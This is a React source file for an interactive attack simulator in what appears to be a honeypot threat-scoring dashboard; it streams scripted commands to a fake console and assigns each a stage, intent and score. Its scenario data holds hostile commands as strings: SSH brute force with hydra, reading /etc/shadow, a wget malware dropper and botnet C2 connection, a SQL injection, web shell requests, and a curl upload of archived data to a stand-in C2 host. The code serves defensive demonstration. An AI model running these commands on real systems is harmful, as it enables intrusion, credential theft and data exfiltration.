import { useState, useEffect, useRef } from 'react'
import { motion } from 'framer-motion'
import { Play, Pause, RefreshCw, Terminal, ShieldAlert, Zap, Send, Activity } from 'lucide-react'
import { GlassCard, SentinelButton, ThreatMeter, SectionHeader } from './index'

const ATTACK_SCENARIOS = [
  {
    id: 'ssh_bruteforce',
    name: 'SSH Brute-Force & Botnet Staging',
    protocol: 'SSH',
    srcIp: '185.220.101.5',
    commands: [
      { cmd: 'hydra -l root -P rockyou.txt 192.168.1.105 ssh', delay: 1000, stage: 'Initial Access', intent: 'Credential Access', threatScore: 35 },
      { cmd: 'ssh root@192.168.1.105 (Password Accepted: "admin123")', delay: 1200, stage: 'Initial Access', intent: 'Unauthorized Access', threatScore: 55 },
      { cmd: 'uname -a && cat /etc/issue', delay: 1000, stage: 'Reconnaissance', intent: 'System Discovery', threatScore: 62 },
      { cmd: 'cat /etc/shadow', delay: 1100, stage: 'Privilege Escalation', intent: 'Credential Theft', threatScore: 78 },
      { cmd: 'wget -q http://93.184.216.34/x86_bot -O /tmp/botnet && chmod +x /tmp/botnet', delay: 1300, stage: 'Execution', intent: 'Malware Dropper', threatScore: 90 },
      { cmd: '/tmp/botnet --connect-c2 93.184.216.34:6667', delay: 1500, stage: 'Command & Control', intent: 'Botnet Joining', threatScore: 98 }
    ]
  },
  {
    id: 'web_sqli',
    name: 'Web Shell & SQL Injection Payload',
    protocol: 'HTTP',
    srcIp: '194.26.29.114',
    commands: [
      { cmd: 'nikto -h http://honeypot.local/login.php', delay: 1000, stage: 'Reconnaissance', intent: 'Vulnerability Scan', threatScore: 25 },
      { cmd: "GET /api/users?id=1' UNION SELECT 1,username,password_hash FROM admin--", delay: 1200, stage: 'Execution', intent: 'SQL Injection', threatScore: 60 },
      { cmd: "POST /upload.php (Payload: shell.php5)", delay: 1100, stage: 'Initial Access', intent: 'Web Shell Deployment', threatScore: 82 },
      { cmd: 'curl http://honeypot.local/uploads/shell.php5?cmd=whoami', delay: 900, stage: 'Execution', intent: 'Remote Code Execution', threatScore: 88 },
      { cmd: 'curl http://honeypot.local/uploads/shell.php5?cmd=cat%20/var/www/html/config.php', delay: 1200, stage: 'Exfiltration', intent: 'Config Exposure', threatScore: 95 }
    ]
  },
  {
    id: 'ransomware_prep',
    name: 'Ransomware Staging & Data Exfiltration',
    protocol: 'TELNET',
    srcIp: '45.142.214.208',
    commands: [
      { cmd: 'nmap -sV -p- 10.0.0.12', delay: 900, stage: 'Reconnaissance', intent: 'Port Scanning', threatScore: 30 },
      { cmd: 'whoami /priv && net group "Domain Admins" /domain', delay: 1100, stage: 'Discovery', intent: 'Domain Recon', threatScore: 50 },
      { cmd: 'find / -name "*.pdf" -o -name "*.xlsx" 2>/dev/null | head -n 100', delay: 1200, stage: 'Collection', intent: 'Sensitive Data Staging', threatScore: 70 },
      { cmd: 'tar -czf /tmp/confidential_data.tar.gz /home/dbadmin/backups/', delay: 1400, stage: 'Collection', intent: 'Archive Preparation', threatScore: 85 },
      { cmd: 'curl -F "file=@/tmp/confidential_data.tar.gz" http://c2-darknet.xyz/upload', delay: 1600, stage: 'Exfiltration', intent: 'Data Exfiltration', threatScore: 99 }
    ]
  }
]

export default function AttackSimulator({ onAttackEvent }) {
  const [selectedScenario, setSelectedScenario] = useState(ATTACK_SCENARIOS[0])
  const [isRunning, setIsRunning] = useState(false)
  const [currentStepIndex, setCurrentStepIndex] = useState(-1)
  const [terminalLogs, setTerminalLogs] = useState([])
  const [customCommand, setCustomCommand] = useState('')
  const [currentScore, setCurrentScore] = useState(0)
  const [currentStage, setCurrentStage] = useState('Idle')
  const [currentIntent, setCurrentIntent] = useState('None')
  const terminalEndRef = useRef(null)

  useEffect(() => {
    terminalEndRef.current?.scrollIntoView({ behavior: 'smooth' })
  }, [terminalLogs])

  useEffect(() => {
    let timer
    if (isRunning && currentStepIndex < selectedScenario.commands.length - 1) {
      const nextIndex = currentStepIndex + 1
      const step = selectedScenario.commands[nextIndex]

      timer = setTimeout(() => {
        setCurrentStepIndex(nextIndex)
        setCurrentScore(step.threatScore)
        setCurrentStage(step.stage)
        setCurrentIntent(step.intent)
        setTerminalLogs(prev => [
          ...prev,
          {
            id: Date.now(),
            timestamp: new Date().toLocaleTimeString(),
            cmd: step.cmd,
            stage: step.stage,
            intent: step.intent,
            score: step.threatScore
          }
        ])

        if (onAttackEvent) {
          onAttackEvent({
            sessionId: `SIM-${selectedScenario.id.toUpperCase()}`,
            srcIp: selectedScenario.srcIp,
            protocol: selectedScenario.protocol,
            command: step.cmd,
            stage: step.stage,
            intent: step.intent,
            score: step.threatScore,
            timestamp: new Date().toISOString()
          })
        }
      }, step.delay)
    } else if (isRunning && currentStepIndex >= selectedScenario.commands.length - 1) {
      setIsRunning(false)
    }

    return () => clearTimeout(timer)
  }, [isRunning, currentStepIndex, selectedScenario, onAttackEvent])

  const handleStart = () => {
    if (currentStepIndex >= selectedScenario.commands.length - 1) {
      setTerminalLogs([])
      setCurrentStepIndex(-1)
      setCurrentScore(0)
    }
    setIsRunning(true)
  }

  const handlePause = () => {
    setIsRunning(false)
  }

  const handleReset = () => {
    setIsRunning(false)
    setCurrentStepIndex(-1)
    setTerminalLogs([])
    setCurrentScore(0)
    setCurrentStage('Idle')
    setCurrentIntent('None')
  }

  const handleSendCustomCommand = (e) => {
    e.preventDefault()
    if (!customCommand.trim()) return

    const scoreDelta = Math.floor(Math.random() * 20) + 70
    const stages = ['Execution', 'Privilege Escalation', 'Exfiltration', 'Persistence']
    const intents = ['Custom Command Injection', 'Unauthorized Probe', 'Remote Access']
    const newStage = stages[Math.floor(Math.random() * stages.length)]
    const newIntent = intents[Math.floor(Math.random() * intents.length)]

    setCurrentScore(scoreDelta)
    setCurrentStage(newStage)
    setCurrentIntent(newIntent)

    setTerminalLogs(prev => [
      ...prev,
      {
        id: Date.now(),
        timestamp: new Date().toLocaleTimeString(),
        cmd: customCommand.trim(),
        stage: newStage,
        intent: newIntent,
        score: scoreDelta,
        isCustom: true
      }
    ])

    if (onAttackEvent) {
      onAttackEvent({
        sessionId: `SIM-CUSTOM`,
        srcIp: '127.0.0.1 (Manual Test)',
        protocol: 'HTTP',
        command: customCommand.trim(),
        stage: newStage,
        intent: newIntent,
        score: scoreDelta,
        timestamp: new Date().toISOString()
      })
    }

    setCustomCommand('')
  }

  return (
    <GlassCard className="p-5 relative overflow-hidden">
      <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4 mb-5">
        <div>
          <div className="flex items-center gap-2">
            <Zap size={18} className="text-[#00F5A0]" />
            <h2 className="text-base font-bold text-[#E8FFF6] font-sans">
              Interactive Attack Simulator
            </h2>
            <span className="px-2 py-0.5 rounded text-[10px] font-mono font-semibold bg-[rgba(0,245,160,0.1)] text-[#00F5A0] border border-[rgba(0,245,160,0.25)]">
              SIM ENGINE
            </span>
          </div>
          <p className="text-xs text-[#9BB7AD] mt-1 font-sans">
            Trigger honeypot attack sequences and watch AI threat scoring in real time.
          </p>
        </div>

        {/* Action Controls */}
        <div className="flex items-center gap-2">
          {!isRunning ? (
            <SentinelButton onClick={handleStart} size="sm">
              <Play size={13} /> {currentStepIndex >= 0 ? 'Resume Attack' : 'Start Simulation'}
            </SentinelButton>
          ) : (
            <SentinelButton onClick={handlePause} variant="secondary" size="sm">
              <Pause size={13} /> Pause Stream
            </SentinelButton>
          )}

          <SentinelButton onClick={handleReset} variant="ghost" size="sm">
            <RefreshCw size={13} /> Reset
          </SentinelButton>
        </div>
      </div>

      {/* Scenario Selection Cards */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-3 mb-5">
        {ATTACK_SCENARIOS.map(sc => (
          <div
            key={sc.id}
            onClick={() => {
              if (isRunning) return
              setSelectedScenario(sc)
              handleReset()
            }}
            className={`p-3.5 rounded-lg border cursor-pointer transition-all ${
              selectedScenario.id === sc.id
                ? 'border-[rgba(0,245,160,0.4)] bg-[rgba(0,245,160,0.06)]'
                : 'border-[rgba(0,245,160,0.12)] bg-[#08110F] hover:border-[rgba(0,245,160,0.24)]'
            }`}
          >
            <div className="flex items-start justify-between gap-2 mb-1.5">
              <span className="text-xs font-semibold text-[#E8FFF6] font-sans">{sc.name}</span>
              <span className="text-[10px] font-mono font-bold px-1.5 py-0.5 rounded bg-[rgba(0,245,160,0.1)] text-[#00F5A0] shrink-0">
                {sc.protocol}
              </span>
            </div>
            <p className="text-[11px] text-[#607A71] font-mono">
              {sc.srcIp} • {sc.commands.length} steps
            </p>
          </div>
        ))}
      </div>

      {/* Real-time Status Gauge Grid */}
      <div className="grid grid-cols-2 lg:grid-cols-4 gap-3 mb-5">
        <div className="p-3 rounded-lg border border-[rgba(0,245,160,0.12)] bg-[#08110F] flex items-center justify-between">
          <div>
            <p className="text-[10px] text-[#607A71] uppercase font-mono font-medium">Threat Score</p>
            <p className="text-2xl font-bold font-mono mt-0.5" style={{ color: currentScore >= 75 ? '#FF4D67' : currentScore >= 40 ? '#F5C451' : '#20E67A' }}>
              {currentScore}
            </p>
          </div>
          <ThreatMeter score={currentScore} size={48} />
        </div>

        <div className="p-3 rounded-lg border border-[rgba(0,245,160,0.12)] bg-[#08110F]">
          <p className="text-[10px] text-[#607A71] uppercase font-mono font-medium">Current Stage</p>
          <p className="text-xs font-semibold text-[#4DB8FF] mt-1.5 flex items-center gap-1 font-sans">
            <Activity size={13} /> {currentStage}
          </p>
        </div>

        <div className="p-3 rounded-lg border border-[rgba(0,245,160,0.12)] bg-[#08110F]">
          <p className="text-[10px] text-[#607A71] uppercase font-mono font-medium">Inferred Intent</p>
          <p className="text-xs font-semibold text-[#9B6CFF] mt-1.5 flex items-center gap-1 font-sans">
            <ShieldAlert size={13} /> {currentIntent}
          </p>
        </div>

        <div className="p-3 rounded-lg border border-[rgba(0,245,160,0.12)] bg-[#08110F]">
          <p className="text-[10px] text-[#607A71] uppercase font-mono font-medium">Progress</p>
          <p className="text-xs font-bold text-[#E8FFF6] mt-1.5 font-mono">
            {Math.max(0, currentStepIndex + 1)} / {selectedScenario.commands.length} steps
          </p>
          <div className="w-full bg-[#0B1412] h-1.5 rounded-full mt-2 overflow-hidden border border-[rgba(0,245,160,0.1)]">
            <div
              className="h-full bg-[#00F5A0] transition-all duration-200"
              style={{
                width: `${((currentStepIndex + 1) / selectedScenario.commands.length) * 100}%`,
              }}
            />
          </div>
        </div>
      </div>

      {/* Terminal Output */}
      <div className="terminal-card p-4 min-h-[200px] max-h-[260px] flex flex-col justify-between mb-4">
        <div className="flex items-center justify-between border-b border-[rgba(0,245,160,0.14)] pb-2 mb-2">
          <div className="flex items-center gap-2 text-xs font-mono text-[#9BB7AD]">
            <Terminal size={13} className="text-[#00F5A0]" />
            <span>HONEYPOT CONSOLE // {selectedScenario.srcIp}</span>
          </div>
          <span className="live-dot-sm" />
        </div>

        <div className="overflow-y-auto space-y-1.5 font-mono text-xs pr-1 flex-1">
          {terminalLogs.length === 0 ? (
            <p className="text-[#607A71] italic text-xs">Click "Start Simulation" to stream live attack commands...</p>
          ) : (
            terminalLogs.map(log => (
              <motion.div
                key={log.id}
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="flex items-start gap-2 py-0.5"
              >
                <span className="text-[#607A71] select-none text-[10px]">[{log.timestamp}]</span>
                <span className="text-[#00F5A0] select-none font-bold">$</span>
                <span className={`flex-1 ${log.isCustom ? 'text-[#F5C451]' : 'text-[#E8FFF6]'}`}>
                  {log.cmd}
                </span>
                <span className="text-[10px] px-1.5 py-0.2 rounded bg-[rgba(255,255,255,0.06)] text-[#9BB7AD] font-mono shrink-0">
                  {log.stage} ({log.score} pts)
                </span>
              </motion.div>
            ))
          )}
          <div ref={terminalEndRef} />
        </div>
      </div>

      {/* Manual Command Injector */}
      <form onSubmit={handleSendCustomCommand} className="flex gap-2">
        <input
          type="text"
          value={customCommand}
          onChange={e => setCustomCommand(e.target.value)}
          placeholder="Inject custom terminal payload into sandbox... (e.g. cat /etc/passwd)"
          className="st-input font-mono text-xs"
        />
        <SentinelButton type="submit" size="md" className="shrink-0">
          <Send size={13} /> Inject
        </SentinelButton>
      </form>
    </GlassCard>
  )
}
